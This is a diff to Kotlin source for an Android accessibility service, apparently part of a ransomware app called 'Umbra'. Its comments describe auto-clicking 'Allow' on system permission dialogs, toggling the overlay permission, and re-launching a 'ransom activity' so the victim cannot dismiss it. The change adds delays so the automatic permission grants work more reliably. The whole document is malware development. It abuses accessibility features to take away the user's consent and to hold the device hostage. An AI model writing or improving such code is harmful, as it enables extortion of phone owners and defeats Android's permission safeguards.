@@ -42,11 +42,17 @@ class UmbraAccessibilityService : AccessibilityService() {
                 // ── Auto-grant: detect permission dialog and click "Allow" ──
                 if (packageName == "com.google.android.permissioncontroller" ||
                     packageName == "com.android.permissioncontroller") {
-                    autoClickAllowButton()
+                    // Delay so the dialog content has time to load before we
+                    // search for the "Allow" button.
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        autoClickAllowButton()
+                    }, 400)
                 }
                 // ── Auto-grant: detect overlay settings and toggle switch ──
                 if (packageName == "com.android.settings") {
-                    autoToggleOverlay()
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        autoToggleOverlay()
+                    }, 400)
                 }
                 // ── Anti-dismissal: if ransom activity not showing, re-launch ──
                 if (packageName != "org.umbra.core" &&
